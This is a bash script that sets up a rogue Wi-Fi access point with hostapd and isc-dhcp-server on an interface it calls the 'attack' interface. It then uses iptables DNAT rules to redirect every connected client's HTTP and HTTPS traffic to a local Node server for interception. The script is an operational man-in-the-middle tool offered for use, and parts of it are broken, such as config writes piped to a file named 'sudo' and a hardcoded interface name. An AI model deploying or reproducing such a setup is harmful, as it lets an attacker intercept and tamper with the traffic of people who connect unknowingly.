
# get the interface_attack and interface_net from inline argument as ./rerouting_magic.sh --attack <interface_attack> --net <interface_net>
# example: ./rerouting_magic.sh --attack wlxc83a35c2e0bb --net wlp2s0

# beutiful log function with time and color
log(){
    echo -e "\e[1;32m[`date +"%T"`]\e[0m $1"
}

while [ "$1" != "" ]; do
    case $1 in
        --attack )              shift
                                ATTACK_INTERFACE=$1
                                ;;
        --net )                 shift
                                NET_INTERFACE=$1
                                ;;
    esac
    shift
done

if [ -z "$ATTACK_INTERFACE" ] || [ -z "$NET_INTERFACE" ]; then
    log "Please provide the attack interface and the net interface"
    log "example: ./rerouting_magic.sh --attack wlxc83a35c2e0bb --net wlp2s0"
    exit 1
fi

# check if we runing as sudo 
if [ "$EUID" -ne 0 ]; then 
  log "Please run as root"
  exit 1
fi

log "starting rerouting magic"
log "Attack interface: $ATTACK_INTERFACE"
log "Net interface: $NET_INTERFACE"

export ATTACK_INTERFACE NET_INTERFACE

apt install hostapd isc-dhcp-server -y > /dev/null 2>&1
npm install > /dev/null 2>&1

log "configuring hostapd and isc-dhcp-server"
# Path: /etc/default/isc-dhcp-server
sudo cp /etc/default/isc-dhcp-server /etc/default/isc-dhcp-server.bak
echo  "
DHCPDv4_CONF=/etc/dhcp/dhcpd.conf
DHCPDv4_PID=/var/run/dhcpd.pid
INTERFACESv4=\"$ATTACK_INTERFACE\"
" > sudo tee /etc/default/isc-dhcp-server

# Path: /etc/dhcp/dhcpd.conf
cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak
echo  "
ddns-update-style none;
subnet 10.100.102.0 netmask 255.255.255.0 {
  range 10.100.102.51 10.100.102.100;
  option domain-name-servers 8.8.4.4, 8.8.8.8;
  option routers 10.100.102.50;
}" > sudo tee /etc/dhcp/dhcpd.conf


# Path: /etc/hostapd/hostapd.conf
cp /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.bak
echo  "interface=wlxc83a35c2e0bb
driver=nl80211
ssid=$ATTACK_INTERFACE
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
#wpa_passphrase=password
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
" > sudo tee /etc/hostapd/hostapd.conf ## uncomment wpa_passphrase if you wish to set a password

# Path: /etc/default/hostapd
cp /etc/default/hostapd /etc/default/hostapd.bak
echo  "DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"" > hostapd

# Path: /etc/sysctl.conf
log "allow forwarding for ipv4"
sysctl -w net.ipv4.ip_forward=1

if ifconfig $ATTACK_INTERFACE; then
    log "interface $ATTACK_INTERFACE exists cunfigure it..."
else
  log "interface $ATTACK_INTERFACE does not exist it may be blocked by rfkill, unblocking it..."
  sudo rfkill unblock wifi; sudo rfkill unblock all; sudo ifconfig $ATTACK_INTERFACE up
fi

ifconfig $ATTACK_INTERFACE down
ifconfig $ATTACK_INTERFACE inet 10.100.102.50 netmask 255.255.255.0
ifconfig $ATTACK_INTERFACE up

log "starting hostapd and isc-dhcp-server"
service hostapd restart
service isc-dhcp-server restart

npm run dev &

log "configuring iptables"
iptables --table nat --flush
iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 80 -j DNAT --to-destination 10.0.0.6:8000
iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 443 -j DNAT --to-destination 10.0.0.6:8443
iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 80 -j DNAT --to-destination 10.0.0.6:8000
iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 443 -j DNAT --to-destination 10.0.0.6:8443
iptables -t nat -A POSTROUTING -o $NET_INTERFACE -j MASQUERADE

log "rerouting magic is done"